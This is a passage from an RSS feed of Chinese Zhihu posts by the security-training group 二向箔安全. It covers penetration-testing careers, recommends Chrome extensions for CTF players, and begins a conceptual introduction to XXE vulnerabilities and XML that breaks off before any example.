应用，客户端应用和标准协议的漏洞指出攻击者可能使用的方法来利用弱点和缺陷。&lt;/li&gt;&lt;li&gt;利用社会工程来揭露系统漏洞（脆弱的用户安全操作或密码策略 ）。&lt;/li&gt;&lt;li&gt;与之合作的公司的考虑（比如因停机而遭受的损失）。&lt;/li&gt;&lt;li&gt;与管理者、IT队伍研究、说明、议论安全发现。&lt;/li&gt;&lt;li&gt;检查和定义信息安全措施的要求。 &lt;/li&gt;&lt;li&gt;致力于提高安全服务，包括持续的提高现有的方法来支持评估提供回馈和评估为一个组织解决安全问题&lt;/li&gt;&lt;li&gt;在一个渗透测试里，你将会集中于利用漏洞（作为目标进入系统）。&lt;/li&gt;&lt;li&gt;一个渗透测试团队会对开放的系统进行拍照，来表示他们能够进入数据库，而不是像罪犯那样实际的去获取数据。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;为什么做软件测试的也可以做渗透测试呢？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;首先，软件测试人员掌握多种测试工具，可以对 web 应用进行全方面的分析；熟悉多种编程语言，可编写一些基本的脚本及工具；对应用产品功能流程的了解，对常见的登录注册、商城等应用场景有所了解。尝试从软件测试进入渗透测试，还需了解更多专业知识，可前往 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twosecurity.cn/%3Fquery_ref%3DqGLdXm&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt; 进行了解。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twosecurity.cn/%3Fquery_ref%3DqGLdXm&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt; 团队，成立于 2017 年 9 月，团队由众多知名白帽组成，主要专注于网络空间安全领域。拥有 10 年的网络安全实践经验，在实战方面经验丰富，知识功底与创造力方面获得了国内外多方白帽的认可，拥有一定国际影响力。团队自成立以来，沉淀发展前沿的安全研究，拥有世界级领先的 Serverless安全技术成果。利用二代云技术打造创新型的 Exeye 技术平台，为多家企业提供了更敏捷更高效更安全的开发方案。除此之外，两年间团队为多家政府及企业提供全面的安全优化方案与安全体系建设，一站式解决企业安全威胁。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-234c6371a4b22080f5e1d47d65e37df6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;581&quot; data-rawheight=&quot;225&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;581&quot; data-original=&quot;https://pic3.zhimg.com/v2-234c6371a4b22080f5e1d47d65e37df6_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-234c6371a4b22080f5e1d47d65e37df6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;581&quot; data-rawheight=&quot;225&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;581&quot; data-original=&quot;https://pic3.zhimg.com/v2-234c6371a4b22080f5e1d47d65e37df6_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-234c6371a4b22080f5e1d47d65e37df6_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;更多资讯请关注 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twosecurity.cn/%3Fquery_ref%3DqGLdXm&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt; 进行了解，最近推出了一系列免费的网络安全技能包，有关渗透测试、网络攻防、黑客技巧尽在其中，学它涨姿势💯。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e9ec43c3f12ecf595c64c9a78f0dffcc_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;607&quot; data-rawheight=&quot;326&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;607&quot; data-original=&quot;https://pic1.zhimg.com/v2-e9ec43c3f12ecf595c64c9a78f0dffcc_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e9ec43c3f12ecf595c64c9a78f0dffcc_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;607&quot; data-rawheight=&quot;326&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;607&quot; data-original=&quot;https://pic1.zhimg.com/v2-e9ec43c3f12ecf595c64c9a78f0dffcc_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-e9ec43c3f12ecf595c64c9a78f0dffcc_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2019-11-23-92418629</guid>
<pubDate>Sat, 23 Nov 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>CTF|你所关注的CTFer都在用的插件合集【附：XXE补给+CTF训练集】</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-11-22-93147181.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/93147181&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;👉不看后悔系列，建议收藏👍&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;相信大家对 CTF 都不陌生了，今天为大家带来了一系列 CTF 必备 Chrome 插件。&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;CTF&lt;/h2&gt;&lt;p&gt;可能很多人想学 CTF，但又怕零基础学不懂。其实，CTF 并没有那么难。&lt;/p&gt;&lt;blockquote&gt;CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF 是一种流行的信息安全竞赛形式，其英文名可直译为“夺得Flag”，也可意译为“夺旗赛”。&lt;/blockquote&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-5d4c6c03158f5d321d068dd05dd99fb3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;950&quot; data-rawheight=&quot;633&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;950&quot; data-original=&quot;https://pic4.zhimg.com/v2-5d4c6c03158f5d321d068dd05dd99fb3_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-5d4c6c03158f5d321d068dd05dd99fb3_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;950&quot; data-rawheight=&quot;633&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;950&quot; data-original=&quot;https://pic4.zhimg.com/v2-5d4c6c03158f5d321d068dd05dd99fb3_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-5d4c6c03158f5d321d068dd05dd99fb3_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;很多大赛的大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式，率先从主办方给出的比赛环境中得到一串具有一定格式的字符串或其他内容，并将其提交给主办方，从而夺得分数。&lt;/p&gt;&lt;blockquote&gt;为了方便称呼，我们把这样的内容称之为“Flag”。&lt;/blockquote&gt;&lt;p&gt;还有就是以答题分先后获取相应的分数，进行排名赛，这也是很多高校 CTF 所热衷的一种比赛形式。（例子就不举了，相信你的学校也有这种比赛，可多多关注）&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-74fb776f7665f1df8ccded02f6e86653_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1315&quot; data-rawheight=&quot;834&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1315&quot; data-original=&quot;https://pic4.zhimg.com/v2-74fb776f7665f1df8ccded02f6e86653_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-74fb776f7665f1df8ccded02f6e86653_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1315&quot; data-rawheight=&quot;834&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1315&quot; data-original=&quot;https://pic4.zhimg.com/v2-74fb776f7665f1df8ccded02f6e86653_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-74fb776f7665f1df8ccded02f6e86653_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;在民间还流传着很多各式各样的 CTF 练习题或平台，有的专项的针对性训练，比如说 XSS 挑战，有的是类似于“游戏”形式的 CTF 训练。&lt;/p&gt;&lt;p&gt;&lt;b&gt;📌【相关 CTF 资料/平台，见文末❤】（够你吃一个月的纯干粮😀）&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;Chrome 插件&lt;/h2&gt;&lt;p&gt;那就直奔主题吧，先来个“老熟人”。&lt;/p&gt;&lt;p&gt;&lt;b&gt;HackBar&lt;/b&gt;&lt;/p&gt;&lt;p&gt;这个不多说，必备的。（在 Chrome 上有几个版本，用自己喜欢的）&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-27fc044040d4dc7d9215fb70c447507e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1910&quot; data-rawheight=&quot;300&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1910&quot; data-original=&quot;https://pic3.zhimg.com/v2-27fc044040d4dc7d9215fb70c447507e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-27fc044040d4dc7d9215fb70c447507e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1910&quot; data-rawheight=&quot;300&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1910&quot; data-original=&quot;https://pic3.zhimg.com/v2-27fc044040d4dc7d9215fb70c447507e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-27fc044040d4dc7d9215fb70c447507e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;或者你可以用 firefox 上的版本，算是插件中的“大哥大”了。&lt;/p&gt;&lt;p&gt;&lt;b&gt;Proxy SwitchyOmega&lt;/b&gt;&lt;/p&gt;&lt;p&gt;这个用来切换代理很方便。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif%3Futm_source%3Dchrome-ntp-icon&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;chrome.google.com/webst&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif?utm_source=chrome-ntp-icon&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;管理界面如下：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-598181caae9d98d2cf12a7afc51cbaa8_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1042&quot; data-rawheight=&quot;540&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1042&quot; data-original=&quot;https://pic1.zhimg.com/v2-598181caae9d98d2cf12a7afc51cbaa8_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-598181caae9d98d2cf12a7afc51cbaa8_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1042&quot; data-rawheight=&quot;540&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1042&quot; data-original=&quot;https://pic1.zhimg.com/v2-598181caae9d98d2cf12a7afc51cbaa8_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-598181caae9d98d2cf12a7afc51cbaa8_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;比如添加一个 Burpsuite 的代理设置&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-3ba3ad08635bead941b8618c596d1be2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1278&quot; data-rawheight=&quot;596&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1278&quot; data-original=&quot;https://pic3.zhimg.com/v2-3ba3ad08635bead941b8618c596d1be2_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-3ba3ad08635bead941b8618c596d1be2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1278&quot; data-rawheight=&quot;596&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1278&quot; data-original=&quot;https://pic3.zhimg.com/v2-3ba3ad08635bead941b8618c596d1be2_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-3ba3ad08635bead941b8618c596d1be2_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;使用的时候只需点击切换即可，特方便。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-52949c009727f62089f97948fe1d6478_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;426&quot; data-rawheight=&quot;323&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;426&quot; data-original=&quot;https://pic1.zhimg.com/v2-52949c009727f62089f97948fe1d6478_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-52949c009727f62089f97948fe1d6478_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;426&quot; data-rawheight=&quot;323&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;426&quot; data-original=&quot;https://pic1.zhimg.com/v2-52949c009727f62089f97948fe1d6478_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-52949c009727f62089f97948fe1d6478_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;EditThisCookie&lt;/b&gt;&lt;/p&gt;&lt;p&gt;这个用来查看、修改 cookie 很方便。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg%3Futm_source%3Dchrome-ntp-icon&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;chrome.google.com/webst&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?utm_source=chrome-ntp-icon&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;比如我登录了知乎，我只需点一下右上角的快捷方式，就可以看到当前的 cookie 值。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-58d90d25ee5bbe8aaf608f785e3b0665_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;632&quot; data-rawheight=&quot;640&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;632&quot; data-original=&quot;https://pic2.zhimg.com/v2-58d90d25ee5bbe8aaf608f785e3b0665_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-58d90d25ee5bbe8aaf608f785e3b0665_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;632&quot; data-rawheight=&quot;640&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;632&quot; data-original=&quot;https://pic2.zhimg.com/v2-58d90d25ee5bbe8aaf608f785e3b0665_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-58d90d25ee5bbe8aaf608f785e3b0665_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;（方不方便，你用用就知道！）&lt;/p&gt;&lt;p&gt;&lt;b&gt;ModHeader&lt;/b&gt;&lt;/p&gt;&lt;p&gt;功能有点多，用得最多的还是加 head 头。&lt;/p&gt;&lt;blockquote&gt;添加和修改HTTP请求标头和响应标头。  &lt;/blockquote&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//chrome.google.com/webstore/detail/modheader/idgpnmonknjnojddfkpgkljpfnnfcklj%3Futm_source%3Dchrome-ntp-icon&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;chrome.google.com/webst&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ore/detail/modheader/idgpnmonknjnojddfkpgkljpfnnfcklj?utm_source=chrome-ntp-icon&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;功能特征👇&lt;/p&gt;&lt;ul&gt;&lt;li&gt;添加/修改/删除请求标头和响应标头&lt;/li&gt;&lt;li&gt;启用基于URL /资源类型的标题修改&lt;/li&gt;&lt;li&gt;在标题中添加评论 -多个不同的配置文件&lt;/li&gt;&lt;li&gt;按名称，值或注释对标题进​​行排序&lt;/li&gt;&lt;li&gt;将值附加到现有请求或响应头&lt;/li&gt;&lt;li&gt;导出和导入标题&lt;/li&gt;&lt;li&gt;克隆个人资料&lt;/li&gt;&lt;li&gt;云备份&lt;/li&gt;&lt;li&gt;标签锁定&lt;/li&gt;&lt;/ul&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-86b6f07cf3be3f7dc386266d8fe26627_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;621&quot; data-rawheight=&quot;329&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;621&quot; data-original=&quot;https://pic4.zhimg.com/v2-86b6f07cf3be3f7dc386266d8fe26627_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-86b6f07cf3be3f7dc386266d8fe26627_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;621&quot; data-rawheight=&quot;329&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;621&quot; data-original=&quot;https://pic4.zhimg.com/v2-86b6f07cf3be3f7dc386266d8fe26627_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-86b6f07cf3be3f7dc386266d8fe26627_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;JavaScript Toggle On and Off&lt;/b&gt;&lt;/p&gt;&lt;p&gt;一键禁用/开启 js。（你想执行JS？我说了算！）&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//chrome.google.com/webstore/detail/javascript-toggle-on-and/cdcgbgnfhhdmdkallfmlachogpghifgf%3Futm_source%3Dchrome-ntp-icon&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;chrome.google.com/webst&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ore/detail/javascript-toggle-on-and/cdcgbgnfhhdmdkallfmlachogpghifgf?utm_source=chrome-ntp-icon&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-ae6f386c25ee02b853d17a251c4f30fe_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;599&quot; data-rawheight=&quot;225&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;599&quot; data-original=&quot;https://pic3.zhimg.com/v2-ae6f386c25ee02b853d17a251c4f30fe_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-ae6f386c25ee02b853d17a251c4f30fe_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;599&quot; data-rawheight=&quot;225&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;599&quot; data-original=&quot;https://pic3.zhimg.com/v2-ae6f386c25ee02b853d17a251c4f30fe_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-ae6f386c25ee02b853d17a251c4f30fe_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;Wappalyzer&lt;/b&gt;&lt;/p&gt;&lt;p&gt;可发现网站上使用的技术。它检测内容管理系统、电子商务平台、Web框架、服务器软件、分析工具等。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg%3Futm_source%3Dchrome-ntp-icon&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;chrome.google.com/webst&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?utm_source=chrome-ntp-icon&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;更多的是用于查看服务器的配置。（把你“扒光”只需要一秒钟）&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e156d2bcb3fcda53ddf7000357b3ddb4_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;501&quot; data-rawheight=&quot;369&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;501&quot; data-original=&quot;https://pic1.zhimg.com/v2-e156d2bcb3fcda53ddf7000357b3ddb4_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e156d2bcb3fcda53ddf7000357b3ddb4_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;501&quot; data-rawheight=&quot;369&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;501&quot; data-original=&quot;https://pic1.zhimg.com/v2-e156d2bcb3fcda53ddf7000357b3ddb4_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-e156d2bcb3fcda53ddf7000357b3ddb4_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;Video Downloader professional&lt;/b&gt;&lt;/p&gt;&lt;p&gt;可下载网页中的视频。。。（咳咳，敲黑板，用于 CTF 学习哈）&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//chrome.google.com/webstore/detail/video-downloader-professi/dakbpnomcpnfffehgdgdcfkaljdfbggj%3Futm_source%3Dchrome-ntp-icon&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;chrome.google.com/webst&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ore/detail/video-downloader-professi/dakbpnomcpnfffehgdgdcfkaljdfbggj?utm_source=chrome-ntp-icon&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6de93b24f0ece762ec75594880605da6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;504&quot; data-rawheight=&quot;131&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;504&quot; data-original=&quot;https://pic3.zhimg.com/v2-6de93b24f0ece762ec75594880605da6_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6de93b24f0ece762ec75594880605da6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;504&quot; data-rawheight=&quot;131&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;504&quot; data-original=&quot;https://pic3.zhimg.com/v2-6de93b24f0ece762ec75594880605da6_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-6de93b24f0ece762ec75594880605da6_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;下载管理器&lt;/b&gt;&lt;/p&gt;&lt;p&gt;为什么要推荐这个？你用 Chrome 下载东西试试，我相信你会回来的。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//chrome.google.com/webstore/detail/download-manager/daoidaoebhfcgccdpgjjcbdginkofmfe%3Futm_source%3Dchrome-ntp-icon&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;chrome.google.com/webst&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ore/detail/download-manager/daoidaoebhfcgccdpgjjcbdginkofmfe?utm_source=chrome-ntp-icon&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ab555a89e9d4b788b68be216fa984361_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;465&quot; data-rawheight=&quot;618&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;465&quot; data-original=&quot;https://pic2.zhimg.com/v2-ab555a89e9d4b788b68be216fa984361_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ab555a89e9d4b788b68be216fa984361_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;465&quot; data-rawheight=&quot;618&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;465&quot; data-original=&quot;https://pic2.zhimg.com/v2-ab555a89e9d4b788b68be216fa984361_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-ab555a89e9d4b788b68be216fa984361_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;好了，今天分享的 Chrome 插件就这些了（如有更好更棒的插件，欢迎下方评论区疯狂戳我）&lt;/p&gt;&lt;hr/&gt;&lt;blockquote&gt;周末别闲着，快起来学知识了。        —— &lt;b&gt;二向箔安全&lt;/b&gt;&lt;/blockquote&gt;&lt;h2&gt;XXE 补给站&lt;/h2&gt;&lt;p&gt;众多 CTF 题型中，XXE 无疑是一大难题，有多少英雄豪杰倒在了 XXE 的碎花裙下，今天我们就来掀开这神秘的面纱。&lt;/p&gt;&lt;blockquote&gt;XXE 漏洞（XML External Entity Injection）即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起 dos 攻击等危害。xxe 漏洞触发的点往往是可以上传 xml 文件的位置，没有对上传的 xml 文件进行过滤，导致可上传恶意 xml 文件。&lt;/blockquote&gt;&lt;h2&gt;XML&lt;/h2&gt;&lt;p&gt;在掀裙之前，我们要先搞清楚 XML 是啥？&lt;/p&gt;&lt;p&gt;XML：可扩展标记语言，标准通用标记语言的子集，XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从 HTML 分离，是独立于软件和硬件的信息传输工具。与 HTML 的区别：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;HTML 被设计用来显示数据 &lt;/li&gt;&lt;li&gt;XML 被设计用来传输和存储数据&lt;/li&gt;&lt;/ul&gt;&lt;h3&gt;&lt;b&gt;XML 文档结构&lt;/b&gt;&lt;/h3&gt;&lt;p&gt;XML 文档结构包括 XML 